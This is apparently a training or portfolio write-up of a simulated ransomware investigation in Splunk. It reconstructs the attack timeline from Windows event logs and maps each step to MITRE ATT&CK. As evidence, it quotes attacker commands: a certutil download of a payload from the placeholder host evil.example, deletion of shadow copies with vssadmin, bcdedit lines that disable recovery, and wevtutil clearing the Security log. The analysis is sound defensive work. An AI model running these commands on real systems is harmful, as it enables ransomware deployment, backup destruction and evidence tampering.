# 🛡️ Splunk Investigation 10 – Ransomware Attack Investigation

## 📌 Scenario

A Windows server generated multiple security events indicating suspicious administrative activity. The objective was to investigate the attack using Splunk, identify the attacker's actions, reconstruct the attack timeline, map the techniques to the MITRE ATT&CK framework, and determine the overall impact.

---

# 🎯 Objectives

- Analyze Windows Event Logs using Splunk
- Identify suspicious processes and commands
- Reconstruct the ransomware attack timeline
- Detect attacker techniques
- Map activities to MITRE ATT&CK
- Classify the severity of the incident

---

# 📊 Dataset Statistics

| Item | Count |
|-------|------:|
| Total Events | 25 |
| Process Creation (4688) | 19 |
| Successful Logon (4624) | 3 |
| Failed Logon (4625) | 1 |
| Special Privileges Assigned (4672) | 1 |
| Object Access (4663) | 1 |

---

# 👤 Most Active User

**User:** Administrator

Administrator generated the highest number of process creation events, making this account the primary focus of the investigation.

---

# 🚨 Severity Distribution

| Severity | Count |
|----------|------:|
| Critical | 10 |
| High | 4 |
| Medium | 3 |
| Low | 8 |

---

# 🔍 Suspicious Processes Identified

- powershell.exe
- certutil.exe
- ransom.exe
- vssadmin.exe
- bcdedit.exe
- wbadmin.exe
- wevtutil.exe
- tasklist.exe
- taskkill.exe
- whoami.exe
- ipconfig.exe
- net.exe
- netstat.exe
- wmic.exe
- notepad.exe

---

# 🔎 Investigation Findings

## 1. PowerShell Execution Policy Bypass

### Command

```powershell
powershell.exe -ExecutionPolicy Bypass
```

### Analysis

The attacker bypassed PowerShell execution policy restrictions to execute malicious scripts without normal security limitations.

**MITRE ATT&CK**

- T1059.001 – PowerShell

---

## 2. Payload Download

### Command

```cmd
certutil.exe -urlcache -split -f http://evil.example/ransom.exe ransom.exe
```

### Analysis

The attacker abused the legitimate Windows utility **certutil.exe** (LOLBin) to download the ransomware payload.

Downloaded File:

```
ransom.exe
```

Downloaded From:

```
http://evil.example/ransom.exe
```

**MITRE ATT&CK**

- T1105 – Ingress Tool Transfer

---

## 3. System Discovery

The attacker performed reconnaissance using several built-in Windows utilities.

Commands observed:

- whoami.exe
- ipconfig.exe
- tasklist.exe
- net.exe
- netstat.exe
- wmic.exe

Purpose:

- Identify current user
- Enumerate running processes
- Collect network information
- Gather system details

---

## 4. Disable Recovery Mechanisms

### Volume Shadow Copy Deletion

Command:

```cmd
vssadmin.exe delete shadows /all /quiet
```

Purpose:

Delete all Volume Shadow Copies to prevent victims from restoring encrypted files.

### Disable Windows Recovery

Commands:

```cmd
bcdedit /set {default} bootstatuspolicy ignoreallfailures

bcdedit /set {default} recoveryenabled No
```

Purpose:

Disable Windows Recovery Environment and boot recovery options.

**MITRE ATT&CK**

- T1490 – Inhibit System Recovery

---

## 5. Ransomware Execution

Payload Executed:

```
ransom.exe
```

Analysis:

The ransomware payload was successfully executed and targeted user data, leading to potential encryption and loss of data availability.

**MITRE ATT&CK**

- T1486 – Data Encrypted for Impact

---

## 6. Backup Activity

Command:

```cmd
wbadmin start backup
```

Analysis:

The dataset shows that a Windows backup operation was started.

Unlike backup deletion commands, this command alone does not indicate malicious backup destruction.

Severity:

Medium

---

## 7. Defense Evasion

Command:

```cmd
wevtutil cl Security
```

Analysis:

The attacker cleared the Windows Security Event Log to remove evidence of malicious activity and hinder forensic investigations.

**MITRE ATT&CK**

- T1070.001 – Clear Windows Event Logs

---

# 🗺️ Attack Timeline

1. Administrator account obtained elevated privileges.
2. PowerShell execution policy bypass was used.
3. certutil.exe downloaded ransom.exe.
4. System reconnaissance performed.
5. Volume Shadow Copies deleted.
6. Windows Recovery Environment disabled.
7. ransomware (ransom.exe) executed.
8. Windows backup process observed.
9. Security Event Logs cleared.

---

# 🎯 MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|----------|------------------------------|------------|
| Execution | PowerShell | T1059.001 |
| Command & Control | Ingress Tool Transfer | T1105 |
| Discovery | System Discovery | T1082 |
| Discovery | Network Discovery | T1016 |
| Impact | Inhibit System Recovery | T1490 |
| Impact | Data Encrypted for Impact | T1486 |
| Defense Evasion | Clear Windows Event Logs | T1070.001 |

---

# 🚨 Incident Severity

**Critical**

Reason:

- Ransomware successfully executed
- Recovery mechanisms disabled
- Shadow Copies deleted
- Event logs cleared
- Multiple LOLBins abused
- Administrative account involved

---

# 🛠️ Tools Used

- Splunk Enterprise
- Windows Event Logs
- SPL (Search Processing Language)

---

# 📚 Skills Demonstrated

- Threat Hunting
- Windows Event Analysis
- Incident Response
- Malware Investigation
- Ransomware Analysis
- MITRE ATT&CK Mapping
- Detection Engineering
- Digital Forensics
- Blue Team Investigation

---

# 🎓 Key Learning Outcomes

- Investigated a complete ransomware attack lifecycle.
- Identified attacker abuse of LOLBins.
- Understood anti-forensics techniques.
- Learned ransomware recovery prevention methods.
- Improved Windows Event Log analysis skills.
- Practiced mapping attacker behavior to MITRE ATT&CK.

---

# 📌 Conclusion

This investigation simulated a realistic ransomware attack against a Windows environment. The attacker leveraged PowerShell, Certutil, Windows administrative utilities, and defense evasion techniques to execute ransomware, disable recovery options, and remove forensic evidence. By analyzing Windows Event Logs in Splunk, the complete attack timeline was successfully reconstructed, demonstrating practical SOC investigation and incident response skills.
